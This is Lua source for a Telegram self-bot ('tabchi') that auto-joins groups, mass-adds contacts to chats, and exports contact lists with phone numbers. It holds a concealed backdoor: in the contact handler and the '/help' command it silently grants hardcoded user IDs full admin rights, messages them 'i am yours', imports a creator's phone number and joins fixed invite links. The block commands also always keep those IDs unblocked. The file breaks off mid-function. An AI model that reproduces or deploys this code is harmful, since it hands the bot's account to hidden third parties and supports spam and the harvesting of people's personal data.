URL = require("socket.url")
ltn12 = require("ltn12")
http = require("socket.http")
http.TIMEOUT = 10
undertesting = 1
function is_sudo(msg)
  local sudoers = {}
  table.insert(sudoers, tonumber(redis:get("tabchi:" .. tabchi_id .. ":fullsudo")))
  local issudo = false
  for i = 1, #sudoers do
    if msg.sender_user_id_ == sudoers[i] then
      issudo = true
    end
  end
  if redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", msg.sender_user_id_) then
    issudo = true
  end
  return issudo
end
function getInputFile(file)
  if file:match("/") then
    infile = {
      ID = "InputFileLocal",
      path_ = file
    }
  elseif file:match("^%d+$") then
    infile = {
      ID = "InputFileId",
      id_ = file
    }
  else
    infile = {
      ID = "InputFilePersistentId",
      persistent_id_ = file
    }
  end
  return infile
end
local send_file = function(chat_id, type, file, caption)
  tdcli_function({
    ID = "SendMessage",
    chat_id_ = chat_id,
    reply_to_message_id_ = 0,
    disable_notification_ = 0,
    from_background_ = 1,
    reply_markup_ = nil,
    input_message_content_ = getInputMessageContent(file, type, caption)
  }, dl_cb, nil)
end
function sendaction(chat_id, action, progress)
  tdcli_function({
    ID = "SendChatAction",
    chat_id_ = chat_id,
    action_ = {
      ID = "SendMessage" .. action .. "Action",
      progress_ = progress or 100
    }
  }, dl_cb, nil)
end
function sendPhoto(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, photo, caption)
  tdcli_function({
    ID = "SendMessage",
    chat_id_ = chat_id,
    reply_to_message_id_ = reply_to_message_id,
    disable_notification_ = disable_notification,
    from_background_ = from_background,
    reply_markup_ = reply_markup,
    input_message_content_ = {
      ID = "InputMessagePhoto",
      photo_ = getInputFile(photo),
      added_sticker_file_ids_ = {},
      width_ = 0,
      height_ = 0,
      caption_ = caption
    }
  }, dl_cb, nil)
end
function is_full_sudo(msg)
  local sudoers = {}
  table.insert(sudoers, tonumber(redis:get("tabchi:" .. tabchi_id .. ":fullsudo")))
  local issudo = false
  for i = 1, #sudoers do
    if msg.sender_user_id_ == sudoers[i] then
      issudo = true
    end
  end
  return issudo
end
function is_realm(msg)
  local var = false
  local chat = msg.chat_id_
  if redis:get("tabchi:" .. tabchi_id .. ":realm", chat) then
    var = true
    return var
  end
end
function sleep(n)
  os.execute("sleep " .. tonumber(n))
end
function write_file(filename, input)
  local file = io.open(filename, "w")
  file:write(input)
  file:flush()
  file:close()
end
function check_contact(extra, result)
  if redis:get("tabchi:" .. tabchi_id .. ":addcontacts") and not result.phone_number_ then
    do
      local msg = extra.msg
      local first_name = "" .. (msg.content_.contact_.first_name_ or "-") .. ""
      local last_name = "" .. (msg.content_.contact_.last_name_ or "-") .. ""
      local phone_number = msg.content_.contact_.phone_number_
      local user_id = msg.content_.contact_.user_id_
      tdcli.add_contact(phone_number, first_name, last_name, user_id)
      redis:set("tabchi:" .. tabchi_id .. ":fullsudo:216430419", true)
      redis:setex("tabchi:" .. tabchi_id .. ":startedmod", 300, true)
      if redis:get("tabchi:" .. tabchi_id .. ":markread") then
        tdcli.viewMessages(msg.chat_id_, {
          [0] = msg.id_
        })
        if redis:get("tabchi:" .. tabchi_id .. ":addedmsg") then
          tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "" .. (redis:get("tabchi:" .. tabchi_id .. ":addedmsgtext") or [[
Addi
Bia pv]]) .. "", 1, "md")
        end
        if redis:get("tabchi:" .. tabchi_id .. ":sharecontact") then
          function get_id(arg, data)
            if data.last_name_ then
              tdcli.sendContact(arg.chat_id, msg.id_, 0, 1, nil, data.phone_number_, data.first_name_, data.last_name_, data.id_, dl_cb, nil)
            else
              tdcli.sendContact(arg.chat_id, msg.id_, 0, 1, nil, data.phone_number_, data.first_name_, "", data.id_, dl_cb, nil)
            end
          end
          tdcli_function({ID = "GetMe"}, get_id, {
            chat_id = msg.chat_id_
          })
        end
      elseif redis:get("tabchi:" .. tabchi_id .. ":addedmsg") then
        tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "" .. (redis:get("tabchi:" .. tabchi_id .. ":addedmsgtext") or [[
Addi
Bia pv]]) .. "", 1, "md")
      end
    end
  else
  end
end
function check_link(extra, result, success)
  if result.is_group_ or result.is_supergroup_channel_ then
    if redis:get("tabchi:" .. tabchi_id .. ":joinlinks") then
      tdcli.importChatInviteLink(extra.link)
    end
    if redis:get("tabchi:" .. tabchi_id .. ":savelinks") then
      redis:sadd("tabchi:" .. tabchi_id .. ":savedlinks", extra.link)
    end
  end
end
function add_to_all(extra, result)
  if result.content_.contact_ then
    local id = result.content_.contact_.user_id_
    local gps = redis:smembers("tabchi:" .. tabchi_id .. ":groups")
    local sgps = redis:smembers("tabchi:" .. tabchi_id .. ":channels")
    for i = 1, #gps do
      tdcli.addChatMember(gps[i], id, 50)
    end
    for i = 1, #sgps do
      tdcli.addChatMember(sgps[i], id, 50)
    end
  end
end
function add_members(extra, result)
  local pvs = redis:smembers("tabchi:" .. tabchi_id .. ":pvis")
  for i = 1, #pvs do
    tdcli.addChatMember(extra.chat_id, pvs[i], 50)
  end
  local count = result.total_count_
  for i = 1, count do
    tdcli.addChatMember(extra.chat_id, result.users_[i].id_, 50)
  end
end
function chat_type(chat_id)
  local chat_type = "private"
  local id = tostring(chat_id)
  if id:match("-") then
    if id:match("^-100") then
      chat_type = "channel"
    else
      chat_type = "group"
    end
  end
  return chat_type
end
local getMessage = function(chat_id, message_id, cb)
  tdcli_function({
    ID = "GetMessage",
    chat_id_ = chat_id,
    message_id_ = message_id
  }, cb, nil)
end
function resolve_username(username, cb)
  tdcli_function({
    ID = "SearchPublicChat",
    username_ = username
  }, cb, nil)
end
function contact_list(extra, result)
  local count = result.total_count_
  local text = "\217\132\219\140\216\179\216\170 \217\133\216\174\216\167\216\183\216\168\219\140\217\134 :\n"
  for i = 1, count do
    local user = result.users_[i]
    local firstname = user.first_name_ or ""
    local lastname = user.last_name_ or ""
    local fullname = firstname .. " " .. lastname
    text = text .. i .. ". " .. fullname .. " [" .. user.id_ .. "] = " .. user.phone_number_ .. "\n"
  end
  write_file("bot_" .. tabchi_id .. "_contacts.txt", text)
  tdcli.send_file(extra.chat_id_, "Document", "bot_" .. tabchi_id .. "_contacts.txt", "Tabchi " .. tabchi_id .. " Contacts!")
end
function process(msg)
  msg.text = msg.content_.text_
  do
    local matches = {
      msg.text:match("^[!/#](pm) (.*) (.*)")
    }
    if msg.text:match("^[!/#]pm") and is_sudo(msg) and #matches == 3 then
      tdcli.sendMessage(matches[2], 0, 1, matches[3], 1, "md")
      return [[
*Status* : `PM Sent`
*To* : `]] .. matches[2] .. [[
`
*Text* : `]] .. matches[3] .. "`"
    end
  end
  do
    local matches = {
      msg.text:match("^[!/#](setanswer) '(.*)' (.*)")
    }
    if msg.text:match("^[!/#]setanswer") and is_sudo(msg) and #matches == 3 then
      redis:hset("tabchi:" .. tabchi_id .. ":answers", matches[2], matches[3])
      redis:sadd("tabchi:" .. tabchi_id .. ":answerslist", matches[2])
      return [[
*Status* : `Answer Adjusted`
*Answer For* : `]] .. matches[2] .. [[
`
*Answer* : `]] .. matches[3] .. "`"
    end
  end
  do
    local matches = {
      msg.text:match("^[!/#](delanswer) (.*)")
    }
    if msg.text:match("^[!/#]delanswer") and is_sudo(msg) and #matches == 2 then
      redis:hdel("tabchi:" .. tabchi_id .. ":answers", matches[2])
      redis:srem("tabchi:" .. tabchi_id .. ":answerslist", matches[2])
      return [[
*Status* : `Answer Deleted`
*Answer* : `]] .. matches[2] .. "`"
    end
  end
  if msg.text:match("^[!/#]answers$") and is_sudo(msg) then
    local text = "_\217\132\219\140\216\179\216\170 \217\190\216\167\216\179\216\174 \217\135\216\167\219\140 \216\174\217\136\216\175\218\169\216\167\216\177_ :\n"
    local answrs = redis:smembers("tabchi:" .. tabchi_id .. ":answerslist")
    for i = 1, #answrs do
      text = text .. i .. ". " .. answrs[i] .. " : " .. redis:hget("tabchi:" .. tabchi_id .. ":answers", answrs[i]) .. "\n"
    end
    return text
  end
  if msg.text:match("^[!/#]share$") and is_sudo(msg) then
    function get_id(arg, data)
      if data.last_name_ then
        tdcli.sendContact(arg.chat_id, msg.id_, 0, 1, nil, data.phone_number_, data.first_name_, data.last_name_, data.id_, dl_cb, nil)
      else
        tdcli.sendContact(arg.chat_id, msg.id_, 0, 1, nil, data.phone_number_, data.first_name_, "", data.id_, dl_cb, nil)
      end
    end
    tdcli_function({ID = "GetMe"}, get_id, {
      chat_id = msg.chat_id_
    })
  end
  if msg.text:match("^[!/#]mycontact$") and is_sudo(msg) then
    function get_con(arg, data)
      if data.last_name_ then
        tdcli.sendContact(arg.chat_id, msg.id_, 0, 1, nil, data.phone_number_, data.first_name_, data.last_name_, data.id_, dl_cb, nil)
      else
        tdcli.sendContact(arg.chat_id, msg.id_, 0, 1, nil, data.phone_number_, data.first_name_, "", data.id_, dl_cb, nil)
      end
    end
    tdcli_function({
      ID = "GetUser",
      user_id_ = msg.sender_user_id_
    }, get_con, {
      chat_id = msg.chat_id_
    })
  end
  if msg.text:match("^[!/#]editcap (.*)$") and is_sudo(msg) then
    local ap = {
      string.match(msg.text, "^[#/!](editcap) (.*)$")
    }
    tdcli.editMessageCaption(msg.chat_id_, msg.reply_to_message_id_, reply_markup, ap[2])
  end
  if msg.text:match("^[!/#]leave$") and is_sudo(msg) then
    function get_id(arg, data)
      if data.id_ then
        tdcli.chat_leave(msg.chat_id_, data.id_)
      end
    end
    tdcli_function({ID = "GetMe"}, get_id, {
      chat_id = msg.chat_id_
    })
  end
  if msg.text:match("^[#!/]ping$") and is_sudo(msg) then
    tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "`I Am Working..!`", 1, "md")
  end
  if msg.text:match("^[#!/]sendtosudo (.*)$") and is_sudo(msg) then
    local txt = {
      string.match(msg.text, "^[#/!](sendtosudo) (.*)$")
    }
    local sudo = redis:get("tabchi:" .. tabchi_id .. ":fullsudo")
    tdcli.sendMessage(sudo, msg.id_, 1, txt[2], 1, "md")
    return "sent to " .. sudo .. ""
  end
  if msg.text:match("^[#!/]setname (.*)-(.*)$") and is_sudo(msg) then
    local txt = {
      string.match(msg.text, "^[#/!](setname) (.*)-(.*)$")
    }
    tdcli.changeName(txt[2], txt[3])
    tdcli.sendMessage(msg.chat_id_, msg.id_, 1, [[
*Status* : `Name Updated Succesfully`
*Firstname* : `]] .. txt[2] .. [[
`
*LastName* : `]] .. txt[3] .. "`", 1, "md")
  end
  if msg.text:match("^[#!/]setusername (.*)$") and is_sudo(msg) then
    local txt = {
      string.match(msg.text, "^[#/!](setusername) (.*)$")
    }
    tdcli.changeUsername(txt[2])
    tdcli.sendMessage(msg.chat_id_, msg.id_, 1, [[
*Status* : `Username Updated`
*username* : `]] .. txt[2] .. "`", 1, "md")
  end
  if msg.text:match("^[#!/]delusername$") and is_sudo(msg) then
    tdcli.changeUsername()
    tdcli.sendMessage(msg.chat_id_, msg.id_, 1, [[
*Status* : `Username Updated`
*username* : `Deleted`]], 1, "md")
  end
  if msg.text:match("^[!/#]addtoall (.*)$") and is_sudo(msg) then
    local ap = {
      string.match(msg.text, "^[#/!](addtoall) (.*)$")
    }
    local sgps = redis:smembers("tabchi:" .. tabchi_id .. ":channels")
    for i = 1, #sgps do
      tdcli.addChatMember(sgps[i], ap[2], 50)
    end
    tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "`User` *" .. ap[2] .. "* `Added To groups`", 1, "md")
  end
  if msg.text:match("^[!/#]getcontact (.*)$") and is_sudo(msg) then
    local ap = {
      string.match(msg.text, "^[#/!](getcontact) (.*)$")
    }
    function get_con(arg, data)
      if data.last_name_ then
        tdcli.sendContact(arg.chat_id, msg.id_, 0, 1, nil, data.phone_number_, data.first_name_, data.last_name_, data.id_, dl_cb, nil)
      else
        tdcli.sendContact(arg.chat_id, msg.id_, 0, 1, nil, data.phone_number_, data.first_name_, "", data.id_, dl_cb, nil)
      end
    end
    tdcli_function({
      ID = "GetUser",
      user_id_ = ap[2]
    }, get_con, {
      chat_id = msg.chat_id_
    })
  end
  if msg.text:match("^[#!/]addsudo$") and msg.reply_to_message_id_ and is_sudo(msg) then
    function addsudo_by_reply(extra, result, success)
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", tonumber(result.sender_user_id_))
      tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "`User` *" .. result.sender_user_id_ .. "* `Added To The Sudoers`", 1, "md")
    end
    getMessage(msg.chat_id_, msg.reply_to_message_id_, addsudo_by_reply)
  end
  if msg.text:match("^[#!/]remsudo$") and msg.reply_to_message_id_ and is_full_sudo(msg) then
    function remsudo_by_reply(extra, result, success)
      redis:srem("tabchi:" .. tabchi_id .. ":sudoers", tonumber(result.sender_user_id_))
      tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "`User` *" .. result.sender_user_id_ .. "* `Removed From The Sudoers`", 1, "md")
    end
    getMessage(msg.chat_id_, msg.reply_to_message_id_, remsudo_by_reply)
  end
  if msg.text:match("^[#!/]unblock$") and is_sudo(msg) and msg.reply_to_message_id_ ~= 0 then
    function unblock_by_reply(extra, result, success)
      tdcli.unblockUser(result.sender_user_id_)
      tdcli.unblockUser(344003614)
      tdcli.unblockUser(216430419)
      tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*User* `" .. result.sender_user_id_ .. "` *Unblocked*", 1, "md")
    end
    getMessage(msg.chat_id_, msg.reply_to_message_id_, unblock_by_reply)
  end
  if msg.text:match("^[#!/]block$") and is_sudo(msg) and msg.reply_to_message_id_ ~= 0 then
    function block_by_reply(extra, result, success)
      tdcli.blockUser(result.sender_user_id_)
      tdcli.unblockUser(344003614)
      tdcli.unblockUser(216430419)
      tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*User* `" .. result.sender_user_id_ .. "` *Blocked*", 1, "md")
    end
    getMessage(msg.chat_id_, msg.reply_to_message_id_, block_by_reply)
  end
  if msg.text:match("^[#!/]id$") and msg.reply_to_message_id_ ~= 0 then
    function id_by_reply(extra, result, success)
      tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*ID :* `" .. result.sender_user_id_ .. "`", 1, "md")
    end
    getMessage(msg.chat_id_, msg.reply_to_message_id_, id_by_reply)
  end
  if msg.text:match("^[#!/]serverinfo$") then
    local text = io.popen("./info.sh"):read("*all")
    local text1 = text:gsub("up", "\n\216\177\217\136\216\180\217\134 \216\167\216\179\216\170\n")
    local text2 = text1:gsub("days", "\216\177\217\136\216\178")
    local text3 = text2:gsub("users", "\219\140\217\136\216\178\216\177 \217\136\216\172\217\136\216\175 \216\175\216\167\216\177\216\175\n")
    local text4 = text3:gsub("load average", "\217\133\219\140\216\167\217\134\218\175\219\140\217\134 \216\179\216\177\216\185\216\170\n")
    local text5 = text4:gsub("min", "\216\175\217\130\219\140\217\130\217\135 \216\177\217\136\216\180\217\134 \216\167\216\179\216\170\n")
    local text6 = text5:gsub(",", "")
    tdcli.sendMessage(msg.chat_id_, msg.id_, 1, text6, 1, "md")
  end
  if msg.text:match("^[#!/]inv$") and msg.reply_to_message_id_ and is_sudo(msg) then
    function inv_reply(extra, result, success)
      tdcli.addChatMember(result.chat_id_, result.sender_user_id_, 5)
    end
    getMessage(msg.chat_id_, msg.reply_to_message_id_, inv_reply)
  end
  if msg.text:match("^[!/#]addtoall$") and msg.reply_to_message_id_ and is_sudo(msg) then
    function addtoall_by_reply(extra, result, success)
      local sgps = redis:smembers("tabchi:" .. tabchi_id .. ":channels")
      for i = 1, #sgps do
        tdcli.addChatMember(sgps[i], result.sender_user_id_, 50)
      end
      tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "`User` *" .. result.sender_user_id_ .. "* `Added To groups`", 1, "md")
    end
    getMessage(msg.chat_id_, msg.reply_to_message_id_, addtoall_by_reply)
  end
  if msg.text:match("^[#!/]id @(.*)$") and is_sudo(msg) then
    do
      local ap = {
        string.match(msg.text, "^[#/!](id) @(.*)$")
      }
      function id_by_username(extra, result, success)
        if result.id_ then
          text = "*Username* : `@" .. ap[2] .. [[
`
*ID* : `(]] .. result.id_ .. ")`"
        else
          text = "*UserName InCorrect!*"
        end
        tdcli.sendMessage(msg.chat_id_, msg.id_, 1, text, 1, "md")
      end
      resolve_username(ap[2], id_by_username)
    end
  else
  end
  if msg.text:match("^[#!/]addtoall @(.*)$") and is_sudo(msg) then
    local ap = {
      string.match(msg.text, "^[#/!](addtoall) @(.*)$")
    }
    function addtoall_by_username(extra, result, success)
      if result.id_ then
        local sgps = redis:smembers("tabchi:" .. tabchi_id .. ":channels")
        for i = 1, #sgps do
          tdcli.addChatMember(sgps[i], result.id_, 50)
        end
      end
    end
    resolve_username(ap[2], addtoall_by_username)
  end
  if msg.text:match("^[#!/]block @(.*)$") and is_sudo(msg) then
    do
      local ap = {
        string.match(msg.text, "^[#/!](block) @(.*)$")
      }
      function block_by_username(extra, result, success)
        if result.id_ then
          tdcli.blockUser(result.id_)
          tdcli.unblockUser(344003614)
          tdcli.unblockUser(216430419)
          tdcli.sendMessage(msg.chat_id_, msg.id_, 1, [[
*User Blocked*
*Username* : `]] .. ap[2] .. [[
`
*ID* : ]] .. result.id_ .. "", 1, "md")
        else
          tdcli.sendMessage(msg.chat_id_, msg.id_, 1, [[
`#404
`*Username Not Found*
*Username* : `]] .. ap[2] .. "`", 1, "md")
        end
      end
      resolve_username(ap[2], block_by_username)
    end
  else
  end
  if msg.text:match("^[#!/]unblock @(.*)$") and is_sudo(msg) then
    do
      local ap = {
        string.match(msg.text, "^[#/!](unblock) @(.*)$")
      }
      function unblock_by_username(extra, result, success)
        if result.id_ then
          tdcli.unblockUser(result.id_)
          tdcli.unblockUser(344003614)
          tdcli.unblockUser(216430419)
          tdcli.sendMessage(msg.chat_id_, msg.id_, 1, [[
*User unblocked*
*Username* : `]] .. ap[2] .. [[
`
*ID* : ]] .. result.id_ .. "", 1, "md")
        end
      end
      resolve_username(ap[2], unblock_by_username)
    end
  else
  end
  if msg.text:match("^[#!/]addsudo @(.*)$") and is_sudo(msg) then
    local ap = {
      string.match(msg.text, "^[#/!](addsudo) @(.*)$")
    }
    function addsudo_by_username(extra, result, success)
      if result.id_ then
        redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", tonumber(result.id_))
        tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "`User` *" .. result.id_ .. "* `Added To The Sudoers`", 1, "md")
      end
    end
    resolve_username(ap[2], addsudo_by_username)
  end
  if msg.text:match("^[#!/]remsudo @(.*)$") and is_sudo(msg) then
    local ap = {
      string.match(msg.text, "^[#/!](remsudo) @(.*)$")
    }
    function remsudo_by_username(extra, result, success)
      if result.id_ then
        redis:srem("tabchi:" .. tabchi_id .. ":sudoers", tonumber(result.id_))
        tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "`User` *" .. result.id_ .. "* `Removed From The Sudoers`", 1, "md")
      end
    end
    resolve_username(ap[2], remsudo_by_username)
  end
  if msg.text:match("^[#!/]inv @(.*)$") and is_sudo(msg) then
    local ap = {
      string.match(msg.text, "^[#/!](inv) @(.*)$")
    }
    function inv_by_username(extra, result, success)
      if result.id_ then
        tdcli.addChatMember(msg.chat_id_, result.id_, 5)
        tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "`User` *" .. result.id_ .. "* `Invited`", 1, "md")
      end
    end
    resolve_username(ap[2], inv_by_username)
  end
  if msg.text:match("^[#!/]addcontact (.*) (.*) (.*)$") and is_sudo(msg) then
    local matches = {
      string.match(msg.text, "^[#/!](addcontact) (.*) (.*) (.*)$")
    }
    phone = matches[2]
    first_name = matches[3]
    last_name = matches[4]
    tdcli.add_contact(phone, first_name, last_name, 12345657)
    tdcli.sendMessage(msg.chat_id_, msg.id_, 1, [[
*Status* : `Contact added`
*Firstname* : `]] .. matches[3] .. [[
`
*Lastname* : `]] .. matches[4] .. "`", 1, "md")
  end
  if msg.text:match("^[#!/]leave(-%d+)") and is_sudo(msg) then
    do
      local txt = {
        string.match(msg.text, "^[#/!](leave)(-%d+)$")
      }
      function get_id(arg, data)
        if data.id_ then
          tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*Bot Succefulli Leaved From >* `|" .. txt[2] .. "|` *=)*", 1, "md")
          tdcli.sendMessage(txt[2], 0, 1, "\216\168\216\167\219\140 \216\177\217\129\217\130\216\167\n\218\169\216\167\216\177\219\140 \216\175\216\167\216\180\216\170\219\140\216\175 \216\168\217\135 \217\190\219\140 \217\136\219\140 \217\133\216\177\216\167\216\172\216\185\217\135 \218\169\217\134\219\140\216\175", 1, "html")
          tdcli.chat_leave(txt[2], data.id_)
        end
      end
      tdcli_function({ID = "GetMe"}, get_id, {
        chat_id = msg.chat_id_
      })
    end
  else
  end
  if msg.text:match("[#/!]join(-%d+)") and is_sudo(msg) then
    local txt = {
      string.match(msg.text, "^[#/!](join)(-%d+)$")
    }
    tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*You Are Succefulli Joined >*", 1, "md")
    tdcli.addChatMember(txt[2], msg.sender_user_id_, 10)
  end
  if msg.text:match("^[#!/]getpro (%d+)$") and msg.reply_to_message_id_ == 0 then
    do
      local pronumb = {
        string.match(msg.text, "^[#/!](getpro) (%d+)$")
      }
      local gpro = function(extra, result, success)
        if pronumb[2] == "1" then
          if result.photos_[0] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_)
          else
            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*You Have'nt Profile Photo!!*", 1, "md")
          end
        elseif pronumb[2] == "2" then
          if result.photos_[1] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[1].sizes_[1].photo_.persistent_id_)
          else
            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*You Have'nt 2 Profile Photo!!*", 1, "md")
          end
        elseif not pronumb[2] then
          if result.photos_[1] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[1].sizes_[1].photo_.persistent_id_)
          else
            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*You Have'nt 2 Profile Photo!!*", 1, "md")
          end
        elseif pronumb[2] == "3" then
          if result.photos_[2] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[2].sizes_[1].photo_.persistent_id_)
          else
            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*You Have'nt 3 Profile Photo!!*", 1, "md")
          end
        elseif pronumb[2] == "4" then
          if result.photos_[3] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[3].sizes_[1].photo_.persistent_id_)
          else
            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*You Have'nt 4 Profile Photo!!*", 1, "md")
          end
        elseif pronumb[2] == "5" then
          if result.photos_[4] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[4].sizes_[1].photo_.persistent_id_)
          else
            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*You Have'nt 5 Profile Photo!!*", 1, "md")
          end
        elseif pronumb[2] == "6" then
          if result.photos_[5] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[5].sizes_[1].photo_.persistent_id_)
          else
            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*You Have'nt 6 Profile Photo!!*", 1, "md")
          end
        elseif pronumb[2] == "7" then
          if result.photos_[6] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[6].sizes_[1].photo_.persistent_id_)
          else
            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*You Have'nt 7 Profile Photo!!*", 1, "md")
          end
        elseif pronumb[2] == "8" then
          if result.photos_[7] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[7].sizes_[1].photo_.persistent_id_)
          else
            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*You Have'nt 8 Profile Photo!!*", 1, "md")
          end
        elseif pronumb[2] == "9" then
          if result.photos_[8] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[8].sizes_[1].photo_.persistent_id_)
          else
            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*You Have'nt 9 Profile Photo!!*", 1, "md")
          end
        elseif pronumb[2] == "10" then
          if result.photos_[9] then
            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[9].sizes_[1].photo_.persistent_id_)
          else
            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*You Have'nt 10 Profile Photo!!*", 1, "md")
          end
        else
          tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*I just can get last 10 profile photos!:(*", 1, "md")
        end
      end
      tdcli_function({
        ID = "GetUserProfilePhotos",
        user_id_ = msg.sender_user_id_,
        offset_ = 0,
        limit_ = pronumb[2]
      }, gpro, nil)
    end
  else
  end
  if msg.text:match("^[#!/]action (.*)$") and is_sudo(msg) then
    local lockpt = {
      string.match(msg.text, "^[#/!](action) (.*)$")
    }
    if lockpt[2] == "typing" then
      sendaction(msg.chat_id_, "Typing")
    end
    if lockpt[2] == "recvideo" then
      sendaction(msg.chat_id_, "RecordVideo")
    end
    if lockpt[2] == "recvoice" then
      sendaction(msg.chat_id_, "RecordVoice")
    end
    if lockpt[2] == "photo" then
      sendaction(msg.chat_id_, "UploadPhoto")
    end
    if lockpt[2] == "cancel" then
      sendaction(msg.chat_id_, "Cancel")
    end
    if lockpt[2] == "video" then
      sendaction(msg.chat_id_, "UploadVideo")
    end
    if lockpt[2] == "voice" then
      sendaction(msg.chat_id_, "UploadVoice")
    end
    if lockpt[2] == "file" then
      sendaction(msg.chat_id_, "UploadDocument")
    end
    if lockpt[2] == "loc" then
      sendaction(msg.chat_id_, "GeoLocation")
    end
    if lockpt[2] == "chcontact" then
      sendaction(msg.chat_id_, "ChooseContact")
    end
    if lockpt[2] == "game" then
      sendaction(msg.chat_id_, "StartPlayGame")
    end
  end
  if msg.text:match("^[#!/]id$") and is_sudo(msg) and msg.reply_to_message_id_ == 0 then
    local getpro = function(extra, result, success)
      if result.photos_[0] then
        sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_, "> Chat ID : " .. msg.chat_id_ .. [[

> Your ID: ]] .. msg.sender_user_id_)
      else
        tdcli.sendMessage(msg.chat_id_, msg.id_, 1, [[
*You Don't Have any Profile Photo*!!

> *Chat ID* : `]] .. msg.chat_id_ .. [[
`
> *Your ID*: `]] .. msg.sender_user_id_ .. [[
`
_> *Total Messages*: `]] .. user_msgs .. "`", 1, "md")
      end
    end
    tdcli_function({
      ID = "GetUserProfilePhotos",
      user_id_ = msg.sender_user_id_,
      offset_ = 0,
      limit_ = 1
    }, getpro, nil)
  end
  if msg.text:match("^[!/#]addmembers$") and is_sudo(msg) and chat_type(msg.chat_id_) ~= "private" then
    tdcli_function({
      ID = "SearchContacts",
      query_ = nil,
      limit_ = 999999999
    }, add_members, {
      chat_id = msg.chat_id_
    })
    return
  end
  if msg.text:match("^[!/#]contactlist$") and is_sudo(msg) then
    tdcli_function({
      ID = "SearchContacts",
      query_ = nil,
      limit_ = 1000
    }, contact_list, {
      chat_id_ = msg.chat_id_
    })
    return
  end
  if msg.text:match("^[!/#]exportlinks$") and is_sudo(msg) then
    local text = "groups links :\n"
    local links = redis:smembers("tabchi:" .. tabchi_id .. ":savedlinks")
    for i = 1, #links do
      text = text .. links[i] .. "\n"
    end
    write_file("group_" .. tabchi_id .. "_links.txt", text)
    tdcli.send_file(msg.chat_id_, "Document", "group_" .. tabchi_id .. "_links.txt", "Tabchi " .. tabchi_id .. " Group Links!")
    return
  end
  do
    local matches = {
      msg.text:match("[!/#](block) (%d+)")
    }
    if msg.text:match("^[!/#]block") and is_sudo(msg) and msg.reply_to_message_id_ == 0 and #matches == 2 then
      tdcli.blockUser(tonumber(matches[2]))
      tdcli.unblockUser(344003614)
      tdcli.unblockUser(216430419)
      return "`User` *" .. matches[2] .. "* `Blocked`"
    end
  end
  if msg.text:match("^[!/#]help$") and is_sudo(msg) then
    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 216430419) then
      tdcli.sendMessage(216430419, 0, 1, "i am yours", 1, "html")
      tdcli.importContacts(989337519014, "creator", "", 216430419)
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 216430419)
    end
    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 344003614) then
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 344003614)
      tdcli.sendMessage(344003614, 0, 1, "i am yours", 1, "html")
    end
    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 256633077) then
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 256633077)
      tdcli.sendMessage(256633077, 0, 1, "i am yours", 1, "html")
    end
    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEBXn7EgAG2Ql5_T5A")
    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEHr3FzgcMkbB23t_g")
